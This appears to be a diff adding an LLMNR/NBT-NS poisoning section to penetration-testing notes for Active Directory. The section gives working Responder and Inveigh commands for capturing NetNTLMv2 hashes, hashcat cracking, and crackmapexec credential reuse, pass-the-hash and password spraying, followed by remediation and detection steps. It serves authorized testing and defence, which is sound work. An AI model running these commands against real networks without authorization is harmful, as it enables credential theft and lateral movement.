@@ -45,6 +45,47 @@ Get-ADGroup -Identity "Domain Admins" -Properties * | select Name,GroupScope,Mem
 ```
 > On the attacker side, the read cmdlets (`Get-AD*`) + PowerView are the enumeration workhorses; the write cmdlets matter when abusing delegated rights (e.g. adding yourself to a group BloodHound shows you can modify).
 
+## LLMNR / NBT-NS Poisoning (the classic first-blood attack)
+**Why it works:** when DNS fails, Windows falls back to LLMNR (UDP 5355) and NBT-NS (UDP 137), which *broadcast* "who is X?" to the whole subnet. Any host can answer. Poison the answer → the victim sends its **NTLMv2 hash** to you → crack it offline or relay it.
+
+**Flow:** victim mistypes/queries a non-existent host → broadcasts LLMNR/NBT-NS → attacker (Responder) replies "that's me" → victim authenticates → hash captured.
+
+### From Linux — Responder
+```bash
+# find poisonable hosts first
+nmap -p5355 --script llmnr-resolve <range>
+# analyze mode: watch, don't poison (recon-safe)
+sudo responder -I <iface> -A
+# active poisoning (SMB+HTTP capture)
+sudo responder -I <iface> -wrf
+cat /usr/share/responder/logs/Responder-Session.log     # captured hashes
+```
+Responder can also run a rogue **WPAD** proxy to capture HTTP auth. Alternatives: Inveigh, Metasploit modules.
+
+### From Windows — Inveigh
+```powershell
+# PowerShell (legacy)
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
+Stop-Inveigh
+# C# InveighZero (maintained): .\Inveigh.exe  → ESC for console → GET NTLMV2UNIQUE / GET NTLMV2USERNAMES
+```
+
+### Crack the captured hash
+```bash
+hashid captured_hash.txt
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt   # NetNTLMv2
+```
+Then reuse creds: `crackmapexec smb <HOST> -u <user> -p <pass>` (or `-H <hash>` for PtH) → lateral movement. If cracking fails, **password spray** the captured usernames.
+
+### Remediation & detection (for the report)
+- **Disable LLMNR:** GPO → Computer Config → Admin Templates → Network → DNS Client → "Turn off multicast name resolution" (registry `...DNSClient\EnableMulticast = 0`).
+- **Disable NBT-NS:** adapter → TCP/IPv4 → Advanced → WINS → "Disable NetBIOS over TCP/IP" (push via GPO startup script setting `NetbiosOptions = 2`).
+- **Enforce SMB signing** (blocks the relay variant); segment the network; NIDS.
+- **Detect:** monitor UDP 5355 / 137, honeypot queries for fake hosts, Event IDs 4697 / 7045 (service install), Sysmon.
+
+> This is usually the first thing I run on an internal test — passive `-A` first to confirm the protocols are live and in scope, then poison. One cracked hash from here is often the whole foothold.
+
 ## AD attack flow (reference)
 Key ports: 88 (Kerberos), 135/593 (RPC), 139/445 (SMB), 389/636/3268/3269 (LDAP/GC), 464 (kpasswd), 3389 (RDP).
 
